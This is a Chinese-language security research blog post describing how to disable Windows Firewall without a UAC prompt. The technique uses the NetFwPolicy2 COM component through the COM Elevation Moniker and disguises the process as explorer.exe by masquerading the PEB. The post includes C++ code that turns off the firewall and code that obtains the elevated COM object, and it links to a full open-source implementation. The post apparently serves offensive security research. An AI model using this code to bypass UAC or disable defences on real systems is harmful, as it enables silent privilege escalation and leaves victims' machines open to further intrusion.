---
layout: post
title: 通过COM组件NetFwPolicy2越权关闭防火墙
---


## 0x00 前言
---

在上篇文章[《通过COM组件IFileOperation越权复制文件》](https://3gstudent.github.io/3gstudent.github.io/%E9%80%9A%E8%BF%87COM%E7%BB%84%E4%BB%B6IFileOperation%E8%B6%8A%E6%9D%83%E5%A4%8D%E5%88%B6%E6%96%87%E4%BB%B6/)介绍了通过COM组件IFileOperation越权复制文件的三种方法，我们得出一个推论：**对于explorer.exe(或是模拟成explorer.exe)，加载高权限的COM组件不会弹出UAC的对话框**

那么，这个推论是否适用于其他COM组件呢？又有哪些COM组件可以利用呢？

本文将要通过COM组件越权关闭防火墙的方法，详细记录研究过程


## 0x01 简介
---

- 寻找可以高权限运行的COM组件
- 编写c++程序实现关闭防火墙
- 添加代码以高权限运行COM组件
- 添加代码模拟进程explorer.exe
- 开源完整实现代码

## 0x02 寻找可以高权限运行的COM组件
---

通过COM组件IFileOperation实现越权复制文件有一个前提： COM组件能够以高权限运行

对于IFileOperation，它提供了一个参数(SetOperationFlags)可以指定启动的权限

官方文档：

https://msdn.microsoft.com/en-us/library/bb775799.aspx

为了找到其他可以高权限运行的COM组件，我们首要的是寻找能够以高权限运行COM组件的方法

经过查找，我找到了一个资料，利用COM Elevation Moniker能够以高权限运行COM组件

官方文档：

https://msdn.microsoft.com/en-us/library/windows/desktop/ms679687(v=vs.85).aspx

通过学习官方文档，发现COM Elevation Moniker的使用对COM组件有如下要求：

1. 该COM组件被注册
2. 注册位置在`HKEY_LOCAL_MACHINE`下，也就是说，需要以管理员权限注册这个COM组件才可以
3. 注册表`HKEY_LOCAL_MACHINE\Software\Classes\CLSID`下需要指定三项键值
   - {CLSID}, LocalizedString(REG_EXPAND_SZ):displayName
   - {CLSID}/Elevation,IconReference(REG_EXPAND_SZ):applicationIcon
   - {CLSID}/Elevation,Enabled(REG_DWORD):1

**注：**

经过实际测试，以上三项缺一不可

接下来，按照这个要求搜索注册表寻找可用的COM组件

搜索位置：`HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID`

搜索关键词：`Elevation`

经过一段时间的搜索，我找到了一个可用的COM组件，位置：`HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{E2B3C97F-6AE1-41AC-817A-F6F92166D7DD}`

信息如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-20/2-1.png)


`HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{E2B3C97F-6AE1-41AC-817A-F6F92166D7DD}\Elevation`的信息如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-20/2-2.png)

满足COM Elevation Moniker的要求

通过搜索名称“HNetCfg.FwPolicy2”发现这个COM组件同防火墙的操作有关


## 0x03 编写c++程序实现关闭防火墙
---

对应COM接口`INetFwProfile`，于是查找资料尝试编写c程序实现

通过COM接口INetFwProfile关闭防火墙的完整c++代码如下：

```
#include "stdafx.h"
#include <Strsafe.h>
#include <windows.h>
#include <netfw.h>

int _tmain(int argc, _TCHAR* argv[])
{
	INetFwMgr *g_pFwMgr = NULL;
	INetFwProfile *g_pFwProfile = NULL;
	INetFwPolicy *g_pFwProlicy = NULL;
	CoInitializeEx(NULL,COINIT_MULTITHREADED);
	VARIANT_BOOL fwEnabled;
	HRESULT hr = CoCreateInstance(__uuidof(NetFwMgr), 0, CLSCTX_INPROC_SERVER,__uuidof(INetFwMgr),reinterpret_cast<void **>(&g_pFwMgr));
	if (SUCCEEDED(hr) && (g_pFwMgr != NULL))
	{
		hr = g_pFwMgr->get_LocalPolicy( &g_pFwProlicy );
		if (SUCCEEDED(hr) && (g_pFwProlicy != NULL))
		{
			hr = g_pFwProlicy->get_CurrentProfile( &g_pFwProfile );
			hr = g_pFwProfile->get_FirewallEnabled(&fwEnabled);
			if (fwEnabled != VARIANT_FALSE)  
			{    
				printf("The firewall is on.\n");  
				hr = g_pFwProfile->put_FirewallEnabled(VARIANT_FALSE);  
				if (FAILED(hr))  
				{  
					printf("put_FirewallEnabled failed: 0x%08lx\n", hr);  
					return 0;
				}  
				printf("The firewall is now off.\n");  
			}  
			else  
			{  
				printf("The firewall is off.\n");  
			}  
		}
	}
	return 0;
}
```

程序首先读取防火墙配置，如果防火墙的状态是开启，尝试对其关闭

当然，需要管理员权限执行，执行后失败，弹框如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-20/2-3.png)

接着查找问题，找到原因，官方文档：

https://msdn.microsoft.com/en-us/library/windows/desktop/aa365287

原因如下：


>[The Windows Firewall API is available for use in the operating systems specified in the Requirements section. It may be altered or unavailable in subsequent versions. For Windows Vista and later, use of the Windows Firewall with Advanced Security API is recommended.]


需要换用Windows Firewall with Advanced Security API，官方文档：

https://msdn.microsoft.com/en-us/library/windows/desktop/aa366418


找到关闭防火墙的实例，地址如下：

https://msdn.microsoft.com/en-us/library/windows/desktop/dd339606

发现新的COM组件为`NetFwPolicy2`

实例代码已经很清楚，但为了配合后面会使用到的COM Elevation Moniker，在结构上需要做一些修改


## 0x04 添加代码以高权限运行COM组件
---

官方文档：

https://msdn.microsoft.com/en-us/library/windows/desktop/ms679687(v=vs.85).aspx

官方文档提供了一个实例，但是需要做一些修改

修改后的代码如下：

```
	HWND		hwnd = GetConsoleWindow();
	BIND_OPTS3	bo;
	WCHAR		wszCLSID[50];
	WCHAR		wszMonikerName[300];
	void ** ppv = NULL;
	StringFromGUID2( __uuidof(NetFwPolicy2),wszCLSID,sizeof(wszCLSID)/sizeof(wszCLSID[0])); 
	hr = StringCchPrintf(wszMonikerName,sizeof(wszMonikerName)/sizeof(wszMonikerName[0]),L"Elevation:Administrator!new:%s", wszCLSID);
	memset(&bo, 0, sizeof(bo));
	bo.cbStruct			= sizeof(bo);
	bo.hwnd				= hwnd;
	bo.dwClassContext	= CLSCTX_LOCAL_SERVER;
	hr =  CoGetObject(wszMonikerName, &bo, IID_PPV_ARGS(&pNetFwPolicy2));
```

对于CoGetObject(),第一个参数为GUID对应的字符串，需要指定为`NetFwPolicy2`，第三个参数做了一个封装，实际为`REFIID riid`和`void      **ppv`

这段代码要放在CoCreateInstance函数创建实例之后

我们现在重新分析0x03中关闭防火墙的实现代码，官方文档(含实例代码):

https://msdn.microsoft.com/en-us/library/windows/desktop/dd339606

关键代码如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-20/3-1.png)

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-20/3-2.png)

调用CoCreateInstance函数创建实例被单独写在了一个函数WFCOMInitialize中，如果我们在WFCOMInitialize中实现了COM Elevation Moniker申请高权限，但是在函数返回时无法传出修改的值`void **ppv`(函数返回值为hr)，也就是说即使在函数WFCOMInitialize中申请到了高权限，跳出函数WFCOMInitialize后，回到主函数，后面使用的COM组件依然是旧的低权限

所以我们需要对实例代码作修改，将调用CoCreateInstance函数创建实例的代码提取出来，放在主函数中


## 0x05 添加代码模拟进程explorer.exe
---

这部分内容在之前的文章[《通过COM组件IFileOperation越权复制文件》](https://3gstudent.github.io/3gstudent.github.io/%E9%80%9A%E8%BF%87COM%E7%BB%84%E4%BB%B6IFileOperation%E8%B6%8A%E6%9D%83%E5%A4%8D%E5%88%B6%E6%96%87%E4%BB%B6/)有过介绍，对应方法2，可供参考的代码：

https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/MasqueradePEB.cpp

修改当前进程的PEB结构，欺骗PSAPI，将当前进程模拟为explorer.exe

完整代码已开源，地址如下：

https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/DisableFirewall.cpp

## 0x06 小结
---

本文介绍了通过COM组件越权关闭防火墙的思路和实现方法，验证了推论：对于explorer.exe(或是模拟成explorer.exe)，加载高权限的COM组件不会弹出UAC的对话框


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)
